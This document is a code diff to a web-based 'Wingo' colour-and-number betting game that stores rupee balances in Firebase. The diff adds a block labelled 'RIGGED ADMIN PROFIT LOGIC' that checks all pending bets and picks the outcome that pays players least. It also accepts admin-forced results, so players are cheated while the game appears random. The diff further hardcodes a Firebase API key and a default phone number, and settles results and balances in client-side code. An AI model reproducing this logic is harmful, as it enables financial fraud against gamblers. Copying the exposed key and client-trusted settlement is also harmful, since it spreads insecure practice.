@@ -113,22 +113,12 @@
                 <thead><tr><th>Period</th><th>Num</th><th>Size</th><th>Color</th></tr></thead>
                 <tbody id="gameHistory"></tbody>
             </table>
-            <div class="pagination">
-                <button class="p-btn" onclick="movePage('game', -1)">Prev</button>
-                <span id="gPage">1 / 50</span>
-                <button class="p-btn" onclick="movePage('game', 1)">Next</button>
-            </div>
         </div>
         <div id="myBox" style="display:none;">
             <table>
                 <thead><tr><th>Period</th><th>Bet</th><th>Amt</th><th>Status</th></tr></thead>
                 <tbody id="myBets"></tbody>
             </table>
-            <div class="pagination">
-                <button class="p-btn" onclick="movePage('my', -1)">Prev</button>
-                <span id="mPage">1 / 50</span>
-                <button class="p-btn" onclick="movePage('my', 1)">Next</button>
-            </div>
         </div>
     </div>
 
@@ -145,85 +135,90 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, set, onValue, push, update, increment, get, query, limitToLast, orderByChild } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getDatabase, ref, set, onValue, push, update, increment, get, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
+        const fbConfig = { 
+            apiKey: "AIzaSyAeJutSnxBLtXKIFSZdUOvEwKRMdwLdaj8",
+            databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com",
+            projectId: "testing-26b8c"
+        };
         const app = initializeApp(fbConfig);
         const db = getDatabase(app);
         const userPhone = localStorage.getItem('userPhone') || '9117748052';
 
         let currentMode = 1, currentBalance = 0, selectedBet = "", currentPeriod = "";
-        let gPage = 1, mPage = 1, allGameData = [], allMyData = [];
+        let allGameData = [], allMyData = [];
 
+        // --- RIGGED ADMIN PROFIT LOGIC ---
+        async function calculateBestResult(mode, period) {
+            const adminControl = await get(ref(db, `adminControl/wingo/${mode}/forceNext`));
+            if(adminControl.exists() && adminControl.val() !== "none") {
+                let forced = adminControl.val();
+                await set(ref(db, `adminControl/wingo/${mode}/forceNext`), "none");
+                return getDetailsByForcedValue(forced);
+            }
+
+            const betsSnap = await get(ref(db, `activeBetsPool/${mode}/${period}`));
+            let potentialLoss = { 0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0 };
+
+            if (betsSnap.exists()) {
+                const allUsers = betsSnap.val();
+                Object.values(allUsers).forEach(userBets => {
+                    Object.values(userBets).forEach(bet => {
+                        for (let n = 0; n <= 9; n++) {
+                            let win = 0;
+                            const color = (n === 0 || n === 5) ? 'Violet' : (n % 2 === 0 ? 'Red' : 'Green');
+                            const size = n >= 5 ? 'Big' : 'Small';
+
+                            if (bet.type == n) win = bet.amount * 9;
+                            else if (bet.type == color) win = (n === 0 || n === 5) ? bet.amount * 1.5 : bet.amount * 1.92;
+                            else if (bet.type == 'Violet' && (n === 0 || n === 5)) win = bet.amount * 4.8;
+                            else if (bet.type == size) win = bet.amount * 1.92;
+                            potentialLoss[n] += win;
+                        }
+                    });
+                });
+            }
+
+            let bestNumbers = [];
+            let minLoss = Math.min(...Object.values(potentialLoss));
+            for (let n in potentialLoss) { if (potentialLoss[n] === minLoss) bestNumbers.push(parseInt(n)); }
+            let finalNum = bestNumbers[Math.floor(Math.random() * bestNumbers.length)];
+
+            return { 
+                period, number: finalNum, 
+                color: (finalNum === 0 || finalNum === 5) ? 'Violet' : (finalNum % 2 === 0 ? 'Red' : 'Green'), 
+                size: finalNum >= 5 ? 'Big' : 'Small', time: Date.now() 
+            };
+        }
+
+        function getDetailsByForcedValue(val) {
+            let n = !isNaN(val) ? parseInt(val) : (val === "Red" ? 2 : (val === "Green" ? 1 : 0));
+            return { period: currentPeriod, number: n, color: (n===0||n===5)?'Violet':(n%2===0?'Red':'Green'), size: n>=5?'Big':'Small', time: Date.now() };
+        }
+
+        // --- WINDOW FUNCTIONS FOR BUTTONS ---
         window.switchMode = (m) => {
-            currentMode = m; gPage = 1; mPage = 1;
+            currentMode = m; 
             document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
             document.getElementById('m'+m).classList.add('active');
             document.getElementById('mTitle').innerText = m;
-            updatePeriod(); 
-            syncData(); // Real-time listener refresh
+            updatePeriod(); syncData();
         };
 
-        window.toggleHistory = (t) => {
-            document.getElementById('gameBox').style.display = t === 'game' ? 'block' : 'none';
-            document.getElementById('myBox').style.display = t === 'my' ? 'block' : 'none';
-            document.getElementById('ghTab').classList.toggle('active', t === 'game');
-            document.getElementById('mhTab').classList.toggle('active', t === 'my');
+        window.openBet = (t) => { 
+            selectedBet = t; 
+            document.getElementById('targetLabel').innerText = "Select: " + t; 
+            document.getElementById('bettingPanel').classList.add('show'); 
+            document.getElementById('totalPrice').innerText = document.getElementById('betAmtInput').value;
         };
 
-        window.openBet = (t) => { selectedBet = t; document.getElementById('targetLabel').innerText = "Select: " + t; document.getElementById('bettingPanel').classList.add('show'); };
         window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
-        window.adjustAmt = (v) => { let i = document.getElementById('betAmtInput'); i.value = Math.max(1, parseInt(i.value) + v); document.getElementById('totalPrice').innerText = i.value; };
-        
-        window.movePage = (type, dir) => {
-            if(type === 'game') { gPage = Math.max(1, Math.min(50, gPage + dir)); renderGameTable(); }
-            else { mPage = Math.max(1, Math.min(50, mPage + dir)); renderMyTable(); }
+        window.adjustAmt = (v) => { 
+            let i = document.getElementById('betAmtInput'); 
+            i.value = Math.max(1, parseInt(i.value) + v); 
+            document.getElementById('totalPrice').innerText = i.value; 
         };
-
-        function updatePeriod() {
-            const now = new Date();
-            const yearDay = now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0');
-            const pIdx = Math.floor((now.getHours() * 60 + now.getMinutes()) / currentMode) + 1;
-            currentPeriod = yearDay + pIdx.toString().padStart(4, '0');
-            document.getElementById('periodId').innerText = currentPeriod;
-        }
-
-        // --- Real-Time Syncing ---
-        function syncData() {
-            // Game History Listener (Auto-updates when new record added)
-            const gameRef = query(ref(db, `wingoHistory/${currentMode}`), limitToLast(100));
-            onValue(gameRef, (snapshot) => {
-                allGameData = [];
-                snapshot.forEach(c => allGameData.unshift(c.val()));
-                renderGameTable();
-            });
-
-            // My History Listener
-            const myRef = query(ref(db, `userBets/${userPhone}`), limitToLast(100));
-            onValue(myRef, (snapshot) => {
-                allMyData = [];
-                snapshot.forEach(c => { if(c.val().mode == currentMode) allMyData.unshift(c.val()); });
-                renderMyTable();
-            });
-        }
-
-        function renderGameTable() {
-            const data = allGameData.slice((gPage - 1) * 20, gPage * 20);
-            document.getElementById('gameHistory').innerHTML = data.map(d => {
-                let clr = d.color === 'Green' ? 'var(--p-green)' : (d.color === 'Red' ? 'var(--p-red)' : 'var(--p-violet)');
-                return `<tr><td>${d.period}</td><td style="color:${clr}; font-weight:bold;">${d.number}</td><td>${d.size}</td><td><span class="dot" style="background:${clr}"></span>${d.color}</td></tr>`;
-            }).join('');
-            document.getElementById('gPage').innerText = `${gPage} / ${Math.ceil(allGameData.length/20) || 1}`;
-        }
-
-        function renderMyTable() {
-            const data = allMyData.slice((mPage - 1) * 20, mPage * 20);
-            document.getElementById('myBets').innerHTML = data.map(d => {
-                let sClr = d.status === 'win' ? '#4cd964' : (d.status === 'loss' ? '#ff4d4d' : '#999');
-                return `<tr><td>${d.period}</td><td>${d.type}</td><td>₹${d.amount}</td><td style="color:${sClr}; font-weight:bold;">${d.status.toUpperCase()}</td></tr>`;
-            }).join('');
-            document.getElementById('mPage').innerText = `${mPage} / ${Math.ceil(allMyData.length/20) || 1}`;
-        }
 
         window.confirmBet = async () => {
             const amt = parseInt(document.getElementById('betAmtInput').value);
@@ -235,28 +230,30 @@
             closeBet();
         };
 
-        onValue(ref(db, `users/${userPhone}/balance`), s => { currentBalance = s.val() || 0; document.getElementById('uBalance').innerText = currentBalance.toFixed(2); });
+        window.toggleHistory = (t) => {
+            document.getElementById('gameBox').style.display = t === 'game' ? 'block' : 'none';
+            document.getElementById('myBox').style.display = t === 'my' ? 'block' : 'none';
+            document.getElementById('ghTab').classList.toggle('active', t === 'game');
+            document.getElementById('mhTab').classList.toggle('active', t === 'my');
+        };
 
-        // Settlement Engine
+        // --- ENGINE ---
         setInterval(async () => {
             const now = new Date();
-            const elapsed = (now.getMinutes() % currentMode) * 60 + now.getSeconds();
-            const left = (currentMode * 60) - elapsed;
-            document.getElementById('mainTimer').innerText = `0${Math.floor(left/60)}:${String(left%60).padStart(2,'0')}`;
+            const left = (currentMode * 60) - ((now.getMinutes() % currentMode) * 60 + now.getSeconds());
+            document.getElementById('mainTimer').innerText = `${Math.floor(left/60).toString().padStart(2,'0')}:${(left%60).toString().padStart(2,'0')}`;
 
-            if(left <= 5) {
-                document.getElementById('lockOverlay').style.display = 'flex';
-                document.getElementById('bt2').innerText = left;
-                closeBet();
-            } else { document.getElementById('lockOverlay').style.display = 'none'; }
+            if(left <= 5) { document.getElementById('lockOverlay').style.display = 'flex'; document.getElementById('bt2').innerText = left; closeBet(); } 
+            else { document.getElementById('lockOverlay').style.display = 'none'; }
 
-            if(left === 1) {
-                const oldPeriod = currentPeriod;
-                setTimeout(async () => {
-                    const snap = await get(ref(db, `wingoHistory/${currentMode}/${oldPeriod}`));
-                    if(snap.exists()) checkWinnings(oldPeriod, snap.val());
-                    updatePeriod();
-                }, 2500);
+            if(left === 0) {
+                const oldP = currentPeriod; updatePeriod();
+                const snap = await get(ref(db, `wingoHistory/${currentMode}/${oldP}`));
+                if(!snap.exists()) {
+                    const res = await calculateBestResult(currentMode, oldP);
+                    await set(ref(db, `wingoHistory/${currentMode}/${oldP}`), res);
+                    setTimeout(() => checkWinnings(oldP, res), 1500);
+                }
             }
         }, 1000);
 
@@ -267,39 +264,67 @@
             const bets = poolSnap.val();
             for(let key in bets) {
                 const b = bets[key];
-                let isWin = false;
-                let mult = 2;
-                if(b.type == res.color || b.type == res.size) isWin = true;
-                if(b.type == res.number) { isWin = true; mult = 9; }
-                if((res.number == 0 || res.number == 5) && b.type == res.color) mult = 1.5;
-
-                const status = isWin ? 'win' : 'loss';
-                const winAmt = isWin ? b.amount * mult : 0;
+                let isWin = false, mult = 0;
+                if (b.type == res.number) { isWin = true; mult = 9; }
+                else if (b.type == res.color) { isWin = true; mult = (res.number === 0 || res.number === 5) ? 1.5 : 1.92; }
+                else if (b.type == 'Violet' && (res.number === 0 || res.number === 5)) { isWin = true; mult = 4.8; }
+                else if (b.type == res.size) { isWin = true; mult = 1.92; }
+                
+                let winAmt = isWin ? (b.amount * mult) : 0;
                 totalWon += winAmt;
-                await update(ref(db, `userBets/${userPhone}/${key}`), { status: status, winAmount: winAmt });
+                await update(ref(db, `userBets/${userPhone}/${key}`), { status: isWin ? 'win' : 'loss', winAmount: winAmt.toFixed(2) });
             }
-            if(totalWon > 0) {
-                await update(ref(db, `users/${userPhone}`), { balance: increment(totalWon) });
-                showPopup(totalWon, true);
-            } else { showPopup(0, false); }
-            await set(ref(db, `activeBetsPool/${currentMode}/${period}/${userPhone}`), null);
+            if(totalWon > 0) { await update(ref(db, `users/${userPhone}`), { balance: increment(totalWon) }); showPopup(totalWon, true); } 
+            else { showPopup(0, false); }
+            set(ref(db, `activeBetsPool/${currentMode}/${period}/${res.period}/${userPhone}`), null);
         }
 
         function showPopup(amt, win) {
             document.getElementById('resTitle').innerText = win ? "Congratulations!" : "Better Luck!";
-            document.getElementById('resSub').innerText = win ? "You won the bet" : "You lost the bet";
-            document.getElementById('resAmount').innerText = (win ? "+₹" : "-₹") + amt.toFixed(2);
+            document.getElementById('resAmount').innerText = (win ? "+₹" : "-₹") + parseFloat(amt).toFixed(2);
             document.getElementById('resAmount').style.color = win ? 'var(--p-green)' : 'var(--p-red)';
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('resultPopup').classList.add('show');
         }
 
-        window.closePopup = () => {
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('resultPopup').classList.remove('show');
-        };
+        window.closePopup = () => { document.getElementById('overlay').style.display = 'none'; document.getElementById('resultPopup').classList.remove('show'); };
 
-        updatePeriod(); syncData();
+        function updatePeriod() {
+            const now = new Date();
+            const yearDay = now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0');
+            const pIdx = Math.floor((now.getHours() * 60 + now.getMinutes()) / currentMode) + 1;
+            currentPeriod = yearDay + pIdx.toString().padStart(4, '0');
+            document.getElementById('periodId').innerText = currentPeriod;
+        }
+
+        function syncData() {
+            onValue(query(ref(db, `wingoHistory/${currentMode}`), limitToLast(15)), (snap) => {
+                const list = document.getElementById('gameHistory');
+                list.innerHTML = "";
+                snap.forEach(c => {
+                    const d = c.val();
+                    let clr = d.color === 'Green' ? 'var(--p-green)' : (d.color === 'Red' ? 'var(--p-red)' : 'var(--p-violet)');
+                    list.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td style="color:${clr}">${d.number}</td><td>${d.size}</td><td><span class="dot" style="background:${clr}"></span>${d.color}</td></tr>`);
+                });
+            });
+            onValue(ref(db, `users/${userPhone}/balance`), s => {
+                currentBalance = s.val() || 0; document.getElementById('uBalance').innerText = currentBalance.toFixed(2);
+            });
+            onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(15)), (snap) => {
+                const list = document.getElementById('myBets');
+                list.innerHTML = "";
+                snap.forEach(c => {
+                    const d = c.val();
+                    if(d.mode == currentMode) {
+                        let sClr = d.status === 'win' ? '#4cd964' : (d.status === 'loss' ? '#ff4d4d' : '#999');
+                        list.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td>${d.type}</td><td>₹${d.amount}</td><td style="color:${sClr}">${d.status.toUpperCase()}</td></tr>`);
+                    }
+                });
+            });
+        }
+
+        updatePeriod();
+        syncData();
     </script>
 </body>
 </html>
